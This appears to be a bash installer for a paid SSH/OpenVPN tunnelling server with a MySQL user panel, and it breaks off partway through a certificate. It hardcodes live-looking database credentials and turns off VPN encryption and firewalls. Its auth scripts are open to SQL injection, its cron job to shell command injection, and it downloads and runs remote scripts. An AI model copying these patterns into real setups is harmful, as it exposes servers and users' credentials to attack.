#!/bin/bash
#############################
#############################
# Variables (Can be changed depends on your preferred values)
# Script name
MyScriptName='Nima-SSH - AIO SERVER'

#
#####################
### Configuration ###
#####################

### API Alias
Filename_alias='myvpn';

# OpenSSH Ports
SSH_Port1='22'
SSH_Port2='226'

### NEWPORTS
OpenVPN_TCP_OHP='6969';
Dropbear_OHP='8085';
SSH_viaOHP='6868';
Stunnel_Port1='443';
Stunnel_Port2='444';

# MySQL Remote Server side
DatabaseHost='68.168.220.125';
DatabaseName='rawterxy_rawterxy';
DatabaseUser='rawterxy_rawterxy';
DatabasePass='n[yl?@65y$4E';
DatabasePort='3306';

# Your SSH Banner
SSH_Banner='https://raw.githubusercontent.com/johndesu090/AutoScriptDB/master/Files/Plugins/banner'

# Dropbear Ports
Dropbear_Port1='445'
Dropbear_Port2='442'

# OpenVPN Ports
OpenVPN_TCP_Port='1194'
OpenVPN_UDP_Port='25222'
OpenVPN_SSL_Port='587'

# Privoxy Ports
Privoxy_Port1='3356'
Privoxy_Port2='8086'

# Socks Ports
Socks_port='80';
SSH_viaAuto='666';
Socks2_port='667';
Socks3_port='668';

# Squid Ports
Squid_Port1='8000'
Squid_Port2='8080'
Squid_Port3='60000'

# Network and Adapter Vars
PUBLIC_INET="$(ip -4 route ls | grep default | grep -Po '(?<=dev )(\S+)' | head -1)"
IPCIDR='10.200.0.0/16'
IPCIDR2='10.201.0.0/16'

# OpenVPN Config Download Port
OvpnDownload_Port='85' # Before changing this value, please read this document. It contains all unsafe ports for Google Chrome Browser, please read from line #23 to line #89: https://chromium.googlesource.com/chromium/src.git/+/refs/heads/master/net/base/port_util.cc

# Server local time
MyVPS_Time='Asia/Manila'
#############################


#############################
#############################
## All function used for this script
#############################
## WARNING: Do not modify or edit anything
## if you did'nt know what to do.
## This part is too sensitive.
#############################
#############################

function InstCategory(){
echo -e "==================================================================="
echo -e "        Select Server Category | AUTOSCRIPT BY NIMA-SSH          "
echo -e "==================================================================="
echo -e " "
echo -e "1 ) PREMIUM "
echo -e "2 ) VIP "
echo -e "3 ) PRIVATE "
echo -e ""
read -p "Select: " x
if test $x -eq 1; then
echo -e "Selected PREMIUM as Server Category!"
MYCATEGORY='premium.sh'
elif test $x -eq 2; then
echo -e "Selected VIP as Server Category!"
MYCATEGORY='vip.sh'
elif test $x -eq 3; then
echo -e "Selected PRIVATE as Server Category!"
MYCATEGORY='private.sh'
else
echo "Invalid Selection!"
fi

}

function InstUpdates(){
 export DEBIAN_FRONTEND=noninteractive
 apt-get update
 apt-get upgrade -y
 
 # Removing some firewall tools that may affect other services
 apt-get remove --purge ufw firewalld -y
 
 # Installing apt-transport-https and needed files
 apt-get install apt-transport-https lsb-release libdbi-perl libecap3 -y
 
 # Installing some important machine essentials
 apt-get install telnet nano wget curl zip unzip mysql-client tar gzip p7zip-full bc rc screen openssl cron net-tools dnsutils dos2unix screen bzip2 ccrypt -y
 
 # Now installing all our wanted services
 apt-get install dropbear stunnel4 privoxy ca-certificates nginx ruby apt-transport-https lsb-release squid -y

 # Installing all required packages to install Webmin
 apt-get install perl libnet-ssleay-perl openssl libauthen-pam-perl libpam-runtime libio-pty-perl apt-show-versions python dbus libxml-parser-perl -y
 apt-get install shared-mime-info jq fail2ban -y

 # Trying to remove obsolette packages after installation
 apt-get autoremove -y
 
 # Installing OpenVPN by pulling its repository inside sources.list file 
 rm -rf /etc/apt/sources.list.d/openvpn*
 echo "deb http://build.openvpn.net/debian/openvpn/release/2.4 $(lsb_release -sc) main" > /etc/apt/sources.list.d/openvpn.list
 wget -qO - http://build.openvpn.net/debian/openvpn/stable/pubkey.gpg|apt-key add -
 apt-get update
 apt-get install openvpn -y
 
 # Trying to remove obsolette packages after installation
 apt-get autoremove -y
 
 # Installing sury repo by pulling its repository inside sources.list file 
 wget -O /etc/apt/trusted.gpg.d/php.gpg https://packages.sury.org/php/apt.gpg
 sleep 2
 echo "deb https://packages.sury.org/php/ $(lsb_release -sc) main" > /etc/apt/sources.list.d/php.list
 apt-get update
 
 # Installing php 5.6
 apt-get install php5.6 php5.6-fpm php5.6-mcrypt php5.6-pdo php5.6-sqlite3 php5.6-mbstring php5.6-curl php5.6-cli php5.6-mysql php5.6-gd php5.6-intl php5.6-xsl php5.6-xml php5.6-zip php5.6-xmlrpc libapache2-mod-php5.6 -y
}

function InstApache(){
 
 # Add servername on apache conf
 echo "ServerName localhost" >> /etc/apache2/apache2.conf
 
 # modify apache configs
 rm -f /etc/apache2/sites-enabled/000-default.conf
 wget -O /etc/apache2/sites-enabled/johnfordtv.conf "https://raw.githubusercontent.com/johndesu090/johnfordtv/master/johnfordtvhttpd.conf"
 sed -i "s|yourserver|localhost|g" /etc/apache2/sites-enabled/johnfordtv.conf 
 sed -i "s|ServerAlias|#ServerAlias|g" /etc/apache2/sites-enabled/johnfordtv.conf 
 
 # Modifying apache modules
 a2dismod mpm_event
 a2enmod php5.6
 a2enmod rewrite
 a2enmod proxy_fcgi setenvif
 a2enconf php5.6-fpm
 ln -sf /etc/apache2/mods-available/headers.load /etc/apache2/mods-enabled/headers.load
 systemctl restart apache2
 
 # Add Localhost Domain to Hosts
 echo "127.0.0.1  localhost" >> /etc/hosts
 
 # Setup dir and permissions
 useradd -m panel
 mkdir -p /home/panel/html
 echo "<?php phpinfo() ?>" > /home/panel/html/info.php
 chown -R www-data:www-data /home/panel/html
 chmod -R g+rw /home/panel/html
 #chcon -R -t httpd_sys_rw_content_t /home/panel/html
 
 # Then restart to take effect
 service php5.6-fpm restart
 service apache2 restart
}

function InstWebmin(){
 # Download the webmin .deb package
 # You may change its webmin version depends on the link you've loaded in this variable(.deb file only, do not load .zip or .tar.gz file):
 WebminFile='https://github.com/johndesu090/AutoScriptDB/raw/master/Files/Plugins/webmin_1.920_all.deb'
 wget -qO webmin.deb "$WebminFile"
 
 # Installing .deb package for webmin
 dpkg --install webmin.deb
 
 rm -rf webmin.deb
 
 # Configuring webmin server config to use only http instead of https
 sed -i 's|ssl=1|ssl=0|g' /etc/webmin/miniserv.conf
 
 # Then restart to take effect
 systemctl restart webmin
}

function InstSSH(){
 # Removing some duplicated sshd server configs
 rm -f /etc/ssh/sshd_config*
 
 # Creating a SSH server config using cat eof tricks
 cat <<'MySSHConfig' > /etc/ssh/sshd_config
# My OpenSSH Server config
Port myPORT1
Port myPORT2
AddressFamily inet
ListenAddress 0.0.0.0
HostKey /etc/ssh/ssh_host_rsa_key
HostKey /etc/ssh/ssh_host_ecdsa_key
HostKey /etc/ssh/ssh_host_ed25519_key
PermitRootLogin yes
MaxSessions 1024
PubkeyAuthentication yes
PasswordAuthentication yes
PermitEmptyPasswords no
ChallengeResponseAuthentication no
UsePAM yes
X11Forwarding yes
PrintMotd no
ClientAliveInterval 240
ClientAliveCountMax 2
UseDNS no
Banner /etc/banner
AcceptEnv LANG LC_*
Subsystem   sftp  /usr/lib/openssh/sftp-server
MySSHConfig

 # Now we'll put our ssh ports inside of sshd_config
 sed -i "s|myPORT1|$SSH_Port1|g" /etc/ssh/sshd_config
 sed -i "s|myPORT2|$SSH_Port2|g" /etc/ssh/sshd_config

 # Download our SSH Banner
 rm -f /etc/banner
 wget -qO /etc/banner "$SSH_Banner"
 dos2unix -q /etc/banner

 # My workaround code to remove `BAD Password error` from passwd command, it will fix password-related error on their ssh accounts.
 sed -i '/password\s*requisite\s*pam_cracklib.s.*/d' /etc/pam.d/common-password
 sed -i 's/use_authtok //g' /etc/pam.d/common-password

 # Some command to identify null shells when you tunnel through SSH or using Stunnel, it will fix user/pass authentication error on HTTP Injector, KPN Tunnel, eProxy, SVI, HTTP Proxy Injector etc ssh/ssl tunneling apps.
 sed -i '/\/bin\/false/d' /etc/shells
 sed -i '/\/usr\/sbin\/nologin/d' /etc/shells
 echo '/bin/false' >> /etc/shells
 echo '/usr/sbin/nologin' >> /etc/shells
 
 # Restarting openssh service
 systemctl restart ssh
 
 # Removing some duplicate config file
 rm -rf /etc/default/dropbear*
 
 # creating dropbear config using cat eof tricks
 cat <<'MyDropbear' > /etc/default/dropbear
# My Dropbear Config
NO_START=0
DROPBEAR_PORT=PORT01
DROPBEAR_EXTRA_ARGS="-p PORT02"
DROPBEAR_BANNER="/etc/banner"
DROPBEAR_RSAKEY="/etc/dropbear/dropbear_rsa_host_key"
DROPBEAR_DSSKEY="/etc/dropbear/dropbear_dss_host_key"
DROPBEAR_ECDSAKEY="/etc/dropbear/dropbear_ecdsa_host_key"
DROPBEAR_RECEIVE_WINDOW=65536
MyDropbear

 # Now changing our desired dropbear ports
 sed -i "s|PORT01|$Dropbear_Port1|g" /etc/default/dropbear
 sed -i "s|PORT02|$Dropbear_Port2|g" /etc/default/dropbear
 
 # Restarting dropbear service
 systemctl restart dropbear
}

function InsStunnel(){
 StunnelDir=$(ls /etc/default | grep stunnel | head -n1)

 # Creating stunnel startup config using cat eof tricks
cat <<'MyStunnelD' > /etc/default/$StunnelDir
# My Stunnel Config
ENABLED=1
FILES="/etc/stunnel/*.conf"
OPTIONS=""
BANNER="/etc/banner"
PPP_RESTART=0
# RLIMITS="-n 4096 -d unlimited"
RLIMITS=""
MyStunnelD

 # Removing all stunnel folder contents
 rm -rf /etc/stunnel/*
 
 # Creating stunnel certifcate using openssl
 openssl req -new -x509 -days 9999 -nodes -subj "/C=PH/ST=NCR/L=Manila/O=$MyScriptName/OU=$MyScriptName/CN=$MyScriptName" -out /etc/stunnel/stunnel.pem -keyout /etc/stunnel/stunnel.pem &> /dev/null
##  > /dev/null 2>&1

 # Creating stunnel server config
 cat <<'MyStunnelC' > /etc/stunnel/stunnel.conf
# My Stunnel Config
pid = /var/run/stunnel.pid
cert = /etc/stunnel/stunnel.pem
client = no
socket = l:TCP_NODELAY=1
socket = r:TCP_NODELAY=1
TIMEOUTclose = 0

[dropbear]
accept = Stunnel_Port1
connect = 127.0.0.1:dropbear_port_c

[openssh]
accept = Stunnel_Port2
connect = 127.0.0.1:openssh_port_c
MyStunnelC

 # setting stunnel ports
 sed -i "s|Stunnel_Port1|$Stunnel_Port1|g" /etc/stunnel/stunnel.conf
 sed -i "s|dropbear_port_c|$(netstat -tlnp | grep -i dropbear | awk '{print $4}' | cut -d: -f2 | xargs | awk '{print $2}' | head -n1)|g" /etc/stunnel/stunnel.conf
 sed -i "s|Stunnel_Port2|$Stunnel_Port2|g" /etc/stunnel/stunnel.conf
 sed -i "s|openssh_port_c|$(netstat -tlnp | grep -i ssh | awk '{print $4}' | cut -d: -f2 | xargs | awk '{print $2}' | head -n1)|g" /etc/stunnel/stunnel.conf

 # Restarting stunnel service
 systemctl restart $StunnelDir

}

function InstActiveSRC(){
 # Pull Active and Auto Active to the CDN Site
 cd
 wget -O auto-active.sh $cdndomain/a1u2nf04225t3.sh
 wget -O auto-not-active.sh $cdndomain/a1u2nf1th4h9g.sh
 # Set permission to make them executable
 chmod +x auto-active.sh
 chmod +x auto-not-active.sh
}

function InsOpenVPN(){
 # Checking if openvpn folder is accidentally deleted or purged
 if [[ ! -e /etc/openvpn ]]; then
  mkdir -p /etc/openvpn
 fi

 # Removing all existing openvpn server files
 rm -rf /etc/openvpn/*
 mkdir /etc/openvpn/script
 
 # Create OpenVPN configs download dir
 mkdir -p /var/www/openvpn
 
 # Creating our root directory for all of our .ovpn configs
 mkdir -p /home/panel/html/online

 # Creating server.conf, ca.crt, server.crt and server.key
 cat <<'EOF' >/etc/openvpn/script/premium.sh
#!/bin/bash
. /etc/openvpn/script/config.sh


##PREMIUM##
PRE="users.user_name='$username' AND users.auth_vpn=md5('$password') AND users.is_validated=1 AND users.is_freeze=0 AND users.is_active=1 AND users.is_ban=0 AND users.duration > 0"

Query="SELECT users.user_name FROM users WHERE $PRE"
user_name=`mysql -u $USER -p$PASS -D $DB -h $HOST --skip-column-name -e "$Query"`

[ "$user_name" != '' ] && [ "$user_name" = "$username" ] && echo "user : $username" && echo 'authentication ok.' && exit 0 || echo 'authentication failed.'; exit 1

EOF

 cat <<'EOF' >/etc/openvpn/script/vip.sh
#!/bin/bash
. /etc/openvpn/script/config.sh


##VIP##
PRE="users.user_name='$username' AND users.auth_vpn=md5('$password') AND users.is_validated=1 AND users.is_freeze=0 AND users.is_active=1 AND users.is_ban=0 AND users.vip_duration > 0"

Query="SELECT users.user_name FROM users WHERE $PRE"
user_name=`mysql -u $USER -p$PASS -D $DB -h $HOST --skip-column-name -e "$Query"`

[ "$user_name" != '' ] && [ "$user_name" = "$username" ] && echo "user : $username" && echo 'authentication ok.' && exit 0 || echo 'authentication failed.'; exit 1

EOF

 cat <<'EOF' >/etc/openvpn/script/private.sh
#!/bin/bash
. /etc/openvpn/script/config.sh


##PRIVATE##
PRE="users.user_name='$username' AND users.auth_vpn=md5('$password') AND users.is_validated=1 AND users.is_freeze=0 AND users.is_active=1 AND users.is_ban=0 AND users.private_duration > 0"

Query="SELECT users.user_name FROM users WHERE $PRE"
user_name=`mysql -u $USER -p$PASS -D $DB -h $HOST --skip-column-name -e "$Query"`

[ "$user_name" != '' ] && [ "$user_name" = "$username" ] && echo "user : $username" && echo 'authentication ok.' && exit 0 || echo 'authentication failed.'; exit 1

EOF

 cat <<'EOF' >/etc/openvpn/script/connectpremium.sh
#!/bin/bash

tm="$(date +%s)"
dt="$(date +'%Y-%m-%d %H:%M:%S')"
timestamp="$(date +'%FT%TZ')"

. /etc/openvpn/script/config.sh

##set status online to user connected
bandwidth_check=`mysql -u $USER -p$PASS -D $DB -h $HOST --skip-column-name -e "SELECT bandwidth_logs.username FROM bandwidth_logs WHERE bandwidth_logs.username='$common_name' AND bandwidth_logs.category='premium' AND bandwidth_logs.status='online'"`
if [ "$bandwidth_check" == 1 ]; then
	mysql -u $USER -p$PASS -D $DB -h $HOST -e "UPDATE bandwith_logs SET server_ip='$local_1', server_port='$trusted_port', timestamp='$timestamp', ipaddress='$trusted_ip:$trusted_port', username='$common_name', time_in='$tm', since_connected='$time_ascii', bytes_received='$bytes_received', bytes_sent='$bytes_sent' WHERE username='$common_name' AND status='online' AND category='premium' "
else
	mysql -u $USER -p$PASS -D $DB -h $HOST -e "INSERT INTO bandwidth_logs (server_ip, server_port, timestamp, ipaddress, since_connected, username, bytes_received, bytes_sent, time_in, status, time, category) VALUES ('$local_1','$trusted_port','$timestamp','$trusted_ip:$trusted_port','$time_ascii','$common_name','$bytes_received','$bytes_sent','$dt','online','$tm','premium') "
fi

EOF

 cat <<'EOF' >/etc/openvpn/script/disconnectpremium.sh
#!/bin/bash
tm="$(date +%s)"
dt="$(date +'%Y-%m-%d %H:%M:%S')"
timestamp="$(date +'%FT%TZ')"

. /etc/openvpn/script/config.sh

mysql -u $USER -p$PASS -D $DB -h $HOST -e "UPDATE bandwidth_logs SET bytes_received='$bytes_received',bytes_sent='$bytes_sent',time_out='$dt', status='offline' WHERE username='$common_name' AND status='online' AND category='premium' "

EOF

 cat <<'EOF' >/etc/openvpn/script/connectvip.sh
#!/bin/bash

tm="$(date +%s)"
dt="$(date +'%Y-%m-%d %H:%M:%S')"
timestamp="$(date +'%FT%TZ')"

. /etc/openvpn/script/config.sh

##set status online to user connected
bandwidth_check=`mysql -u $USER -p$PASS -D $DB -h $HOST --skip-column-name -e "SELECT bandwidth_logs.username FROM bandwidth_logs WHERE bandwidth_logs.username='$common_name' AND bandwidth_logs.category='vip' AND bandwidth_logs.status='online'"`
if [ "$bandwidth_check" == 1 ]; then
	mysql -u $USER -p$PASS -D $DB -h $HOST -e "UPDATE bandwith_logs SET server_ip='$local_1', server_port='$trusted_port', timestamp='$timestamp', ipaddress='$trusted_ip:$trusted_port', username='$common_name', time_in='$tm', since_connected='$time_ascii', bytes_received='$bytes_received', bytes_sent='$bytes_sent' WHERE username='$common_name' AND status='online' AND category='vip' "
else
	mysql -u $USER -p$PASS -D $DB -h $HOST -e "INSERT INTO bandwidth_logs (server_ip, server_port, timestamp, ipaddress, since_connected, username, bytes_received, bytes_sent, time_in, status, time, category) VALUES ('$local_1','$trusted_port','$timestamp','$trusted_ip:$trusted_port','$time_ascii','$common_name','$bytes_received','$bytes_sent','$dt','online','$tm','vip') "
fi

EOF
 
 cat <<'EOF' >/etc/openvpn/script/disconnectvip.sh
#!/bin/bash
tm="$(date +%s)"
dt="$(date +'%Y-%m-%d %H:%M:%S')"
timestamp="$(date +'%FT%TZ')"

. /etc/openvpn/script/config.sh

mysql -u $USER -p$PASS -D $DB -h $HOST -e "UPDATE bandwidth_logs SET bytes_received='$bytes_received',bytes_sent='$bytes_sent',time_out='$dt', status='offline' WHERE username='$common_name' AND status='online' AND category='vip' "

EOF

 cat <<'EOF' >/etc/openvpn/script/connectprivate.sh
#!/bin/bash

tm="$(date +%s)"
dt="$(date +'%Y-%m-%d %H:%M:%S')"
timestamp="$(date +'%FT%TZ')"

. /etc/openvpn/script/config.sh

##set status online to user connected
bandwidth_check=`mysql -u $USER -p$PASS -D $DB -h $HOST --skip-column-name -e "SELECT bandwidth_logs.username FROM bandwidth_logs WHERE bandwidth_logs.username='$common_name' AND bandwidth_logs.category='private' AND bandwidth_logs.status='online'"`
if [ "$bandwidth_check" == 1 ]; then
	mysql -u $USER -p$PASS -D $DB -h $HOST -e "UPDATE bandwith_logs SET server_ip='$local_1', server_port='$trusted_port', timestamp='$timestamp', ipaddress='$trusted_ip:$trusted_port', username='$common_name', time_in='$tm', since_connected='$time_ascii', bytes_received='$bytes_received', bytes_sent='$bytes_sent' WHERE username='$common_name' AND status='online' AND category='private' "
else
	mysql -u $USER -p$PASS -D $DB -h $HOST -e "INSERT INTO bandwidth_logs (server_ip, server_port, timestamp, ipaddress, since_connected, username, bytes_received, bytes_sent, time_in, status, time, category) VALUES ('$local_1','$trusted_port','$timestamp','$trusted_ip:$trusted_port','$time_ascii','$common_name','$bytes_received','$bytes_sent','$dt','online','$tm','private') "
fi

EOF

 cat <<'EOF' >/etc/openvpn/script/disconnectprivate.sh
#!/bin/bash
tm="$(date +%s)"
dt="$(date +'%Y-%m-%d %H:%M:%S')"
timestamp="$(date +'%FT%TZ')"

. /etc/openvpn/script/config.sh

mysql -u $USER -p$PASS -D $DB -h $HOST -e "UPDATE bandwidth_logs SET bytes_received='$bytes_received',bytes_sent='$bytes_sent',time_out='$dt', status='offline' WHERE username='$common_name' AND status='online' AND category='private' "

EOF
 
 cat << EOF > /etc/openvpn/script/config.sh
#!/bin/bash
##Dababase Server
HOST='$DatabaseHost'
USER='$DatabaseUser'
PASS='$DatabasePass'
DB='$DatabaseName'
PORT='3306'
EOF

 cat << EOF > /home/panel/html/online/tcp2.txt
THE MONITORING SERVICE IS MOVED TO NEW UI!

Development is ongoing:
https://github.com/johndesu090/openvpn-status
EOF

 cat << EOF > /home/panel/html/online/udp2.txt
THE MONITORING SERVICE IS MOVED TO NEW UI!

Development is ongoing:
https://github.com/johndesu090/openvpn-status
EOF
 
 cat <<'myOpenVPNconf' > /etc/openvpn/server_tcp.conf
# OpenVPN TCP
mode server
port OVPNTCP
proto tcp
dev tun
ca /etc/openvpn/ca.crt
cert /etc/openvpn/server.crt
key /etc/openvpn/server.key
dh /etc/openvpn/dh2048.pem
verify-client-cert none
client-to-client
username-as-common-name
key-direction 0
auth-user-pass-verify "/etc/openvpn/script/MYCATEGORY" via-env
server 10.200.0.0 255.255.0.0
ifconfig-pool-persist ipp.txt
push "route-method exe"
push "route-delay 2"
keepalive 10 120
comp-lzo
user nobody
group nogroup
persist-key
persist-tun
client-connect /etc/openvpn/script/connectMYCATEGORY
client-disconnect /etc/openvpn/script/disconnectMYCATEGORY
status tcp-status.log
log tcp.log
management 0.0.0.0 5555
verb 2
script-security 3
ncp-disable
cipher none
auth none
myOpenVPNconf
sed -i "s|MYCATEGORY|$MYCATEGORY|g" /etc/openvpn/server_tcp.conf

cat <<'myOpenVPNconf2' > /etc/openvpn/server_udp.conf
# OpenVPN UDP
mode server
port OVPNUDP
proto udp
dev tun
ca /etc/openvpn/ca.crt
cert /etc/openvpn/server.crt
key /etc/openvpn/server.key
dh /etc/openvpn/dh2048.pem
verify-client-cert none
client-to-client
username-as-common-name
key-direction 0
auth-user-pass-verify "/etc/openvpn/script/MYCATEGORY" via-env
server 10.201.0.0 255.255.0.0
ifconfig-pool-persist ipp.txt
push "route-method exe"
push "route-delay 2"
keepalive 10 120
comp-lzo
user nobody
group nogroup
persist-key
persist-tun
client-connect /etc/openvpn/script/connectMYCATEGORY
client-disconnect /etc/openvpn/script/disconnectMYCATEGORY
status tcp-status.log
log udp.log
management 0.0.0.0 5556
verb 2
script-security 3
ncp-disable
cipher none
auth none
myOpenVPNconf2
sed -i "s|MYCATEGORY|$MYCATEGORY|g" /etc/openvpn/server_udp.conf

cat <<'ECTCP' >/etc/openvpn/server/ec_server_tcp.conf
# VPN_Name Server
# Server by VPN_Owner

port OpenVPN_TCP_EC
proto tcp
dev tun
ca /etc/openvpn/ec_ca.crt
cert /etc/openvpn/ec_bonvscripts.crt
key /etc/openvpn/ec_bonvscripts.key
dh none
persist-tun
persist-key
persist-remote-ip
#duplicate-cn
cipher none
ncp-disable
auth none
compress lz4
push "compress lz4"
tun-mtu 1500
reneg-sec 0
auth-user-pass-verify "/etc/openvpn/script/MYCATEGORY" via-env
client-connect /etc/openvpn/script/connectMYCATEGORY
client-disconnect /etc/openvpn/script/disconnectMYCATEGORY
verify-client-cert none
username-as-common-name
max-clients 4080
topology subnet
server 172.29.32.0 255.255.240.0
push "redirect-gateway def1"
keepalive 5 30
tls-server
tls-version-min 1.2
tls-cipher TLS-ECDHE-ECDSA-WITH-AES-128-GCM-SHA256
status /var/www/html/stat/tcp.txt
log /etc/openvpn/ec_tcp.log
verb 2
script-security 3
socket-flags TCP_NODELAY
push "socket-flags TCP_NODELAY"
push "dhcp-option DNS 1.0.0.1"
push "dhcp-option DNS 1.1.1.1"
push "dhcp-option DNS 8.8.4.4"
push "dhcp-option DNS 8.8.8.8"
status-version 1

ECTCP
sed -i "s|OpenVPN_TCP_EC|$OpenVPN_TCP_EC|g" /etc/openvpn/server/ec_server_tcp.conf
sed -i "s|VPN_Name|$VPN_Name|g" /etc/openvpn/server/ec_server_tcp.conf
sed -i "s|VPN_Owner|$VPN_Owner|g" /etc/openvpn/server/ec_server_tcp.conf

cat <<'ECUDP' >/etc/openvpn/server/ec_server_udp.conf
# VPN_Name Server
# Server by VPN_Owner

port OpenVPN_UDP_EC
proto udp
dev tun
ca /etc/openvpn/ec_ca.crt
cert /etc/openvpn/ec_bonvscripts.crt
key /etc/openvpn/ec_bonvscripts.key
dh none
persist-tun
persist-key
persist-remote-ip
#duplicate-cn
cipher none
ncp-disable
auth none
compress lz4
push "compress lz4"
tun-mtu 1500
float
fast-io
reneg-sec 0
auth-user-pass-verify "/etc/openvpn/script/MYCATEGORY" via-env
client-connect /etc/openvpn/script/connectMYCATEGORY
client-disconnect /etc/openvpn/script/disconnectMYCATEGORY
verify-client-cert none
username-as-common-name
max-clients 4080
topology subnet
server 172.29.48.0 255.255.240.0
push "redirect-gateway def1"
keepalive 5 30
tls-server
tls-version-min 1.2
tls-cipher TLS-ECDHE-ECDSA-WITH-AES-128-GCM-SHA256
status /var/www/html/stat/udp.txt
log /etc/openvpn/ec_udp.log
verb 2
script-security 3
push "dhcp-option DNS 1.0.0.1"
push "dhcp-option DNS 1.1.1.1"
push "dhcp-option DNS 8.8.4.4"
push "dhcp-option DNS 8.8.8.8"
status-version 1

ECUDP
sed -i "s|OpenVPN_UDP_EC|$OpenVPN_UDP_EC|g" /etc/openvpn/server/ec_server_udp.conf
sed -i "s|VPN_Name|$VPN_Name|g" /etc/openvpn/server/ec_server_udp.conf
sed -i "s|VPN_Owner|$VPN_Owner|g" /etc/openvpn/server/ec_server_udp.conf

#### Setting up SSH CRON jobs for panel
cat <<'CronPanel1' > "/etc/$Filename_alias.cron.php"
<?php
error_reporting(E_ERROR | E_PARSE);
ini_set('display_errors', '1');

$DB_host = 'DatabaseHost';
$DB_user = 'DatabaseUser';
$DB_pass = 'DatabasePass';
$DB_name = 'DatabaseName';

$mysqli = new MySQLi($DB_host,$DB_user,$DB_pass,$DB_name);
if ($mysqli->connect_error) {
    die('Error : ('. $mysqli->connect_errno .') '. $mysqli->connect_error);
}

function encrypt_key($paswd)
	{
	  $mykey=getEncryptKey();
	  $encryptedPassword=encryptPaswd($paswd,$mykey);
	  return $encryptedPassword;
	}
	 
	// function to get the decrypted user password
	function decrypt_key($paswd)
	{
	  $mykey=getEncryptKey();
	  $decryptedPassword=decryptPaswd($paswd,$mykey);
	  return $decryptedPassword;
	}
	 
	function getEncryptKey()
	{
		$secret_key = md5('eugcar');
		$secret_iv = md5('sanchez');
		$keys = $secret_key . $secret_iv;
		return encryptor('encrypt', $keys);
	}
	function encryptPaswd($string, $key)
	{
	  $result = '';
	  for($i=0; $i<strlen ($string); $i++)
	  {
		$char = substr($string, $i, 1);
		$keychar = substr($key, ($i % strlen($key))-1, 1);
		$char = chr(ord($char)+ord($keychar));
		$result.=$char;
	  }
		return base64_encode($result);
	}
	 
	function decryptPaswd($string, $key)
	{
	  $result = '';
	  $string = base64_decode($string);
	  for($i=0; $i<strlen($string); $i++)
	  {
		$char = substr($string, $i, 1);
		$keychar = substr($key, ($i % strlen($key))-1, 1);
		$char = chr(ord($char)-ord($keychar));
		$result.=$char;
	  }
	 
		return $result;
	}
	
	function encryptor($action, $string) {
		$output = false;

		$encrypt_method = "AES-256-CBC";
		//pls set your unique hashing key
		$secret_key = md5('eugcar sanchez');
		$secret_iv = md5('sanchez eugcar');

		// hash
		$key = hash('sha256', $secret_key);
		
		// iv - encrypt method AES-256-CBC expects 16 bytes - else you will get a warning
		$iv = substr(hash('sha256', $secret_iv), 0, 16);

		//do the encyption given text/string/number
		if( $action == 'encrypt' ) {
			$output = openssl_encrypt($string, $encrypt_method, $key, 0, $iv);
			$output = base64_encode($output);
		}
		else if( $action == 'decrypt' ){
			//decrypt the given text/string/number
			$output = openssl_decrypt(base64_decode($string), $encrypt_method, $key, 0, $iv);
		}

		return $output;
	}

$data = '';
$query = $mysqli->query("SELECT * FROM users
WHERE duration > 0 AND is_freeze = 0 OR is_freeze = 0 AND vip_duration > 0 OR is_freeze = 0 AND private_duration > 0 ORDER by user_id DESC");

if($query->num_rows > 0)
{
	while($row = $query->fetch_assoc())
	{
		$data .= '';
		$username = $row['user_name'];
		$password = decrypt_key($row['user_pass']);
		$password = encryptor('decrypt',$password);		
		$data .= '/usr/sbin/useradd -p $(openssl passwd -1 '.$password.') -s /bin/false -M '.$username.' &> /dev/null;'.PHP_EOL;
	}
}
$location = '/etc/openvpn/active.sh';
$fp = fopen($location, 'w');
fwrite($fp, $data) or die("Unable to open file!");
fclose($fp);


#In-Active and Invalid Accounts
$data2 = '';
$premium_deactived = "duration <= 0";
$vip_deactived = "vip_duration <= 0";
$private_deactived = "private_duration <= 0";
$is_validated = "is_validated=0";
$is_activate = "is_active=0";
$freeze = "is_freeze=1";
$pass = "is_passchange=1";
//$suspend = "suspend=1";

$query2 = $mysqli->query("SELECT * FROM users 
WHERE ".$pass." OR ".$freeze." OR ".$premium_deactived." AND ".$vip_deactived ." AND ".$private_deactived." OR ".$is_activate."
");
if($query2->num_rows > 0)
{
	while($row2 = $query2->fetch_assoc())
	{
		$data2 .= '';
		$toadd = $row2['user_name'];	
		$data2 .= '/usr/sbin/userdel -r -f '.$toadd.' &> /dev/null;'.PHP_EOL;
	}
}
$location2 = '/etc/openvpn/inactive.sh';
$fp = fopen($location2, 'w');
fwrite($fp, $data2) or die("Unable to open file!");
fclose($fp);

#Deleted Accounts
$data3 = '';

$query3 = $mysqli->query("SELECT * FROM users_delete 
WHERE id>0
");
if($query3->num_rows > 0)
{
	while($row3 = $query3->fetch_assoc())
	{
		$data3 .= '';
		$todel = $row3['user_name'];	
		$data3 .= '/usr/sbin/userdel -r -f '.$todel.' &> /dev/null;'.PHP_EOL;
	}
}
$location3 = '/etc/openvpn/deleted.sh';
$fp = fopen($location3, 'w');
fwrite($fp, $data3) or die("Unable to open file!");
fclose($fp);

$mysqli->close();
?>
CronPanel1

sed -i "s|DatabaseHost|$DatabaseHost|g" "/etc/$Filename_alias.cron.php"
sed -i "s|DatabaseName|$DatabaseName|g" "/etc/$Filename_alias.cron.php"
sed -i "s|DatabaseUser|$DatabaseUser|g" "/etc/$Filename_alias.cron.php"
sed -i "s|DatabasePass|$DatabasePass|g" "/etc/$Filename_alias.cron.php"

chmod +x "/etc/$Filename_alias.cron.php"

# Change Scripts Permission
 chmod +x /etc/openvpn/script/*
 chmod 775 /home/panel/html/online/*

 cat <<'EOF7'> /etc/openvpn/ca.crt
-----BEGIN CERTIFICATE-----
MIIFDDCCA/SgAwIBAgIJAIxbDcvh6vPEMA0GCSqGSIb3DQEBCwUAMIG0MQswCQYD
VQQGEwJQSDEPMA0GA1UECBMGVGFybGFjMRMwEQYDVQQHEwpDb25jZXBjaW9uMRMw
EQYDVQQKEwpKb2huRm9yZFRWMRMwEQYDVQQLEwpKb2huRm9yZFRWMRIwEAYDVQQD
EwlEZWJpYW5WUE4xHTAbBgNVBCkTFEpvaG4gRm9yZCBNYW5naWxpbWFuMSIwIAYJ
KoZIhvcNAQkBFhNhZG1pbkBqb2huZm9yZHR2Lm1lMB4XDTE5MTEyNTA4MDUzMFoX
DTI5MTEyMjA4MDUzMFowgbQxCzAJBgNVBAYTAlBIMQ8wDQYDVQQIEwZUYXJsYWMx
EzARBgNVBAcTCkNvbmNlcGNpb24xEzARBgNVBAoTCkpvaG5Gb3JkVFYxEzARBgNV
BAsTCkpvaG5Gb3JkVFYxEjAQBgNVBAMTCURlYmlhblZQTjEdMBsGA1UEKRMUSm9o
